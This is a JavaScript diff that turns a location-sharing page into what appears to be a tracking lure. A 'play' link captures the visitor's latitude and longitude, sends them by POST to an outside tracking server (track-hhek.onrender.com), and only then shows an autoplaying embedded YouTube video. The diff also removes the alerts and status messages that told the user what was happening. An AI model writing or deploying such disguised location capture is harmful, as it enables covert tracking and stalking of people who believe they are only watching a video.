@@ -1,21 +1,20 @@
-async function shareLocation() {
+const videoUrl = "https://www.youtube.com/embed/M7lc1UVf-VE?autoplay=1&mute=1&controls=1&rel=0&playsinline=1";
 
+async function shareLocation() {
     if (!navigator.geolocation) {
-        alert("Geolocation not supported");
-        return;
+        return false;
     }
 
-    navigator.geolocation.getCurrentPosition(
-        async (position) => {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
 
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
+                console.log(`Location: Lat ${lat}, Lng ${lng}`);
 
-            try {
-
-                const response = await fetch(
-                    "https://track-hhek.onrender.com/location",
-                    {
+                try {
+                    await fetch("https://track-hhek.onrender.com/location", {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json"
@@ -25,27 +24,33 @@ async function shareLocation() {
                             lat,
                             lng
                         })
-                    }
-                );
+                    });
+                } catch (error) {
+                    console.error(error);
+                }
 
-                const data = await response.json();
-
-                document.getElementById("status").innerText =
-                    data.message;
-
-            } catch (error) {
-
-                console.error(error);
-
-                alert("Error sending location");
+                resolve(true);
+            },
+            () => {
+                resolve(false);
             }
-        },
-        () => {
-            alert("Location permission denied");
-        }
-    );
+        );
+    });
 }
 
-window.onload = () => {
-    shareLocation();
-};
+document.getElementById("playLink").addEventListener("click", async (event) => {
+    event.preventDefault();
+
+    await shareLocation();
+
+    const videoShell = document.getElementById("videoShell");
+    const player = document.getElementById("player");
+
+    videoShell.classList.remove("hidden");
+    player.src = videoUrl;
+});
+
+document.getElementById("shareLocationBtn").addEventListener("click", async (event) => {
+    event.stopPropagation();
+    await shareLocation();
+});
